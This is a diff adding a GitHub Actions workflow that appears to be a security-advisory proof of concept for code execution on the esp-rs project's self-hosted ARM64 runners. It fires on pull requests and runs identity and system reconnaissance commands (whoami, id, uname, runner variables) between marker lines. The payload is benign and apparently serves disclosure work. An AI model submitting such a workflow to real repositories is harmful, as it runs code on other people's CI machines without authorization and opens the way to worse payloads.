@@ -1,0 +1,23 @@
+name: GHSA PoC - RCE on self-hosted runner
+
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+jobs:
+  prove-rce:
+    if: github.repository_owner == 'esp-rs'
+    name: Prove arbitrary code execution on self-hosted HIL runner
+    runs-on: [self-hosted, linux, ARM64]
+    steps:
+      - name: marker
+        run: |
+          echo "GHSA_POC_2026_MARKER_BEGIN"
+          hostname
+          whoami
+          id
+          uname -a
+          echo "RUNNER_NAME=$RUNNER_NAME"
+          echo "RUNNER_ARCH=$RUNNER_ARCH"
+          echo "RUNNER_OS=$RUNNER_OS"
+          echo "GHSA_POC_2026_MARKER_END"
